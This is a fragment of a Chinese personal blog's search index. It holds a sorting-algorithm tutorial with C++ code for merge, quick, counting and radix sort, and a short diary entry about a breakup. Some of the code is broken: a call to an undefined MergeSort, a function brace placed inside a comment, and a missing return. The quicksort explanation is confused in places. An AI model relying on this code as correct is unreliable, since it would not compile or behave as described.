class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> mid,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="comment">//low为第1有序区的第1个元素，i指向第1个元素, mid为第1有序区的最后1个元素</span></span><br><span class="line">    <span class="keyword">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//mid+1为第2有序区第1个元素，j指向第1个元素</span></span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in"><span class="keyword">new</span></span>(nothrow) <span class="keyword">int</span>[high-low+<span class="number">1</span>]; <span class="comment">//temp数组暂存合并的有序序列</span></span><br><span class="line">    <span class="keyword">if</span>(!temp)&#123; <span class="comment">//内存分配失败</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&lt;=arr[j]) <span class="comment">//较小的先存入temp中</span></span><br><span class="line">            temp[k++]=arr[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp[k++]=arr[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)<span class="comment">//若比较完之后，第一个有序区仍有剩余，则直接复制到t数组中</span></span><br><span class="line">        temp[k++]=arr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=high)<span class="comment">//同上</span></span><br><span class="line">        temp[k++]=arr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=low,k=<span class="number">0</span>;i&lt;=high;i++,k++)<span class="comment">//将排好序的存回arr中low到high这区间</span></span><br><span class="line">arr[i]=temp[k];</span><br><span class="line">    <span class="keyword">delete</span> []temp;<span class="comment">//删除指针，由于指向的是数组，必须用delete []</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//用递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort1</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,low,mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,mid+<span class="number">1</span>,high);</span><br><span class="line">        <span class="built_in">Merge</span>(arr,low,mid,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用非递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort2</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> n)</span><span class="comment">//n代表数组中元素个数，即数组最大下标是n-1&#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function">int step = 1;</span></span></span><br><span class="line"><span class="comment"><span class="function">while(step&lt;n) //当元素个数不是2的幂时可能会出错，未考虑第2个序列个数不足的情况</span></span></span><br><span class="line"><span class="comment"><span class="function">&#123;</span></span></span><br><span class="line"><span class="comment"><span class="function">for(int i=0;i&lt;=n-step-1;i+=2*step)</span></span></span><br><span class="line"><span class="comment"><span class="function">Merge(arr,i,i+step-1,i+2*step-1);</span></span></span><br><span class="line"><span class="comment"><span class="function">step*=2;</span></span></span><br><span class="line"><span class="comment"><span class="function">&#125;*/</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> size</span>=<span class="number">1</span>,low,mid,high;</span><br><span class="line"><span class="keyword">while</span>(size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">low=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low+size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">mid=low+size<span class="number">-1</span>;</span><br><span class="line">high=mid+size;</span><br><span class="line"><span class="keyword">if</span>(high&gt;n<span class="number">-1</span>)<span class="comment">//第二个序列个数不足size</span></span><br><span class="line">high=n<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">Merge</span>(arr,low,mid,high);<span class="comment">//调用归并子函数</span></span><br><span class="line">low=high+<span class="number">1</span>;<span class="comment">//下一次归并时第一关序列的下界</span></span><br><span class="line">&#125;</span><br><span class="line">size*=<span class="number">2</span>;<span class="comment">//范围扩大一倍</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>它是一种非常高效也很常用的排序算法，主要有三个零件：left左指针，right右指针和base基准数。举个例子如下图所示：</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/4046a55350b105743a315ad7a0e8689acd1fee115ea3a730/0" alt="img"></p><ul><li>首先假设数列a为[6, 3, 7, 4, 1]，则<strong>left左指针为数列a最开始的元素</strong>6，<strong>right右指针为数列b最末端的元素</strong>1，<strong>base基准数为left左指针</strong>6（注意这个<strong>base基准数从头到尾都不改动</strong>的）。</li></ul><ol><li>先从right指向的数与base对比：</li></ol><ul><li>如果right&lt;base，则将right值替换left值，然后left向右移一位，同时right值替换为空值，且right指针位置不变，然后让left此时指的数与base对比。</li><li>如果right&gt;base，则将right值替换right值（即保持不变），然后right向左移一位，同时left值替换为空值，且left指针位置不变，然后让right此时指的数与base对比。</li></ul><ol><li><p>重复上述操作，直到左右指针重叠，此时就直接将base值放入重叠位置即可。</p><p>总结上面的就是：<strong>先右开始对比，之后’小于则替换left并移left，然后新left对比base’或’大于则替换right并移right，然后新right对比base‘, left和right重合后用base替换</strong>。它的时间复杂度<strong>取决于base值真实在排序后的位置</strong>，如果base刚好为<strong>排序中间的位置</strong>，时间复杂度为<strong>Ο(nlog2n)</strong>，如果base为数列<strong>最大值或最小值</strong>，则为<strong>Ο(n2)</strong>。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//快速排序（从小到大）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, vector&lt;<span class="keyword">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(left &gt;= right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">int</span> i, j, base, temp;</span><br><span class="line">i = left, j = right;</span><br><span class="line">base = arr[left];  <span class="comment">//取最左边的数为基准数</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (arr[j] &gt;= base &amp;&amp; i &lt; j)</span><br><span class="line">j--;</span><br><span class="line"><span class="keyword">while</span> (arr[i] &lt;= base &amp;&amp; i &lt; j)</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基准数归位</span></span><br><span class="line">arr[left] = arr[i];</span><br><span class="line">arr[i] = base;</span><br><span class="line"><span class="built_in">quickSort</span>(left, i - <span class="number">1</span>, arr);<span class="comment">//递归左边</span></span><br><span class="line"><span class="built_in">quickSort</span>(i + <span class="number">1</span>, right, arr);<span class="comment">//递归右边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><p>计数排序并不基于元素的比较，而是一种<strong>利用数组下标来确定元素正确位置的算法</strong>。通过对每个数组中的每个元素进行相应的计数统计，通过计数值确定元素的正确位置的排序算法。计数排序需要知道待排序数据的取值范围，以方便申请辅助空间，这是计数排序的一个缺点。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMyLnpoaW1nLmNvbS84MC92Mi03MmYzY2NiZWUzYzA2YzYyMjRkYTgwMTcwNGY1MjVlZl8xNDQwdy5qcGc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">counting_sort</span><span class="params">(<span class="keyword">int</span> data[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>* sorted = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">  <span class="keyword">int</span> max = data[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[i] &gt; max)</span><br><span class="line">      max = data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span>* count = <span class="keyword">new</span> <span class="keyword">int</span>[max+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; max+<span class="number">1</span>; ++i)</span><br><span class="line">    count[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 记录频次</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    count[data[i]]++;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 累加计数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max; i++)</span><br><span class="line">    count[i] += count[i - <span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 确定最终位置</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    sorted[count[data[i]] - <span class="number">1</span>] = data[i];</span><br><span class="line">    count[data[i]]--;<span class="comment">//注意</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    data[i] = sorted[i];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> [] sorted;</span><br><span class="line">  <span class="keyword">delete</span> [] count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>从低位开始，对所有数字进行排序。例如第1轮排序后，数字的个位数要有序；第2轮排序后，数字的十位数要有序，如果十位数相同的数，个位数要按照之前的相对顺序摆放；依次类推直至最高位排序完成。在对每位进行排序时，选择的排序算法一定要是<strong>稳定的排序</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">rxsort</span><span class="params">(<span class="keyword">int</span> A[],<span class="keyword">int</span> l,<span class="keyword">int</span> h,<span class="keyword">int</span> d,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span>==A||l&gt;h)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> size = h-l+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span>* counts = <span class="keyword">new</span> <span class="keyword">int</span>[k];<span class="comment">//用于计数排序的辅助数据，详见计数排序</span></span><br><span class="line">    <span class="keyword">int</span>* temp = <span class="keyword">new</span> <span class="keyword">int</span>[size];<span class="comment">//用于存储重新排序的数组</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> pval=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//依次处理不同的位</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)&#123;</span><br><span class="line">        <span class="comment">//counts数组清零</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=l;j&lt;=h;j++)&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            1.data[j]/pval：去掉数字data[j]的后i个数，例如：</span></span><br><span class="line"><span class="comment">            当data[j]=1234,i=2时，此时pval=100,data[j]/pval=12;</span></span><br><span class="line"><span class="comment">            2.(data[j]/pval)%k：取数字data[j]/pval的最后一位数</span></span><br><span class="line"><span class="comment">            3.(int)(data[j]/pval)%k:取数字data[j]的第i位数</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            统计数组A中每个数字的第i位数中各个数字的频数,用于计数排序；</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            counts[index]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算累加频数，用户计数排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = counts[j] + counts[j<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//使用倒数第i+1位数对A进行排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=h;j&gt;=l;j--)&#123;</span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            temp[counts[index]<span class="number">-1</span>] = A[j];</span><br><span class="line">            counts[index]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将按第i为数排序后的结果保存回数组A中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)</span><br><span class="line">            A[j+l] = temp[j];</span><br><span class="line">        <span class="comment">//更新pval</span></span><br><span class="line">        pval = pval*k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] counts;</span><br><span class="line">    <span class="keyword">delete</span>[] temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/07/05/%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/07/05/%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>もう終わった，从未想过会这样潦草收场，曾讥笑两三个月的快餐式恋爱，以为自己不一样，看来我错了（笑）是我不理解其中苦衷吧没有真正的对与错吧，有些矛盾无法解决，分歧在相处中只会愈发显现，一段感情意味着的责任也只有身处其中才能感受到，大概都累了吧</p><p>今年的春色因你而格外明艳，感谢从我的世界走过，お元気ですか、私は元気です，脑海莫名浮现一起去看的《情书》的名场景。</p><p>it’s probably for the best，我大概无法抽出精力给一场终究不会有结果的感情吧——不久前终于下定了留学的决心，或许没有那么多时间去玩闹了吧……一念既定，万山难阻，愿走出这墙内，去外面的世界</p><p>一如今生，<br>无有也无是，<br>无痛也无乐。</p><p>佩索阿可真是个妙人，道破我此时的心理状态。似乎确凿没有感受到很多痛苦，这样的结果是我纠结后的选择，意识到不合适，大抵就应该这般快刀斩断吧</p><p>不知命运是否会让我在大学认识the one，更不知会是什么样的，不过我想，她应是能够陪我一同学习进步的吧，“绿鬓视草，红袖添香，眷属疑仙”，又甚至，她能陪我一起出国？学长学姐的事迹令人艳羡，双双赴美，只羡鸳鸯不羡仙……命运一向待我不薄，或许会遇到吧</p><p>这红酒后劲有点足，头居然这就晕了，晚安，南京</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
